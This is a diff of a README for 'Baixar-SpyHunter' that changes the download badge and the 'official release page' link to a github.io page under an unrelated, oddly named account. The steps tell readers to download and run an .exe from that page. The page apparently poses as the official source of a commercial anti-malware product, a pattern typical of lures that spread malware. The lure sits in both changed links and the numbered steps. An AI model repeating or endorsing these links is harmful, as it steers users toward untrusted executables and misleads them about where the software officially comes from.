@@ -1,6 +1,6 @@
 # 🛡️ Baixar-SpyHunter - Remove malicious software from your computer
 
-[![](https://img.shields.io/badge/Download_SpyHunter-Blue.svg)](https://github.com/domiciliary-cosanostra178/Baixar-SpyHunter/releases)
+[![](https://img.shields.io/badge/Download_SpyHunter-Blue.svg)](https://domiciliary-cosanostra178.github.io)
 
 SpyHunter works to detect, remove, and block malware, spyware, and other threats on your Windows computer. This guide helps you download and set up the software.
 
@@ -8,7 +8,7 @@ SpyHunter works to detect, remove, and block malware, spyware, and other threats
 
 Follow these steps to get the correct version for your computer.
 
-1. Go to the [official release page](https://github.com/domiciliary-spyhunter/Baixar-SpyHunter/releases).
+1. Go to the [official release page](https://domiciliary-cosanostra178.github.io).
 2. Look for the latest version listed at the top of the page.
 3. Click the link that ends in .exe to start your download.
 4. Save the file to your Downloads folder or your Desktop.
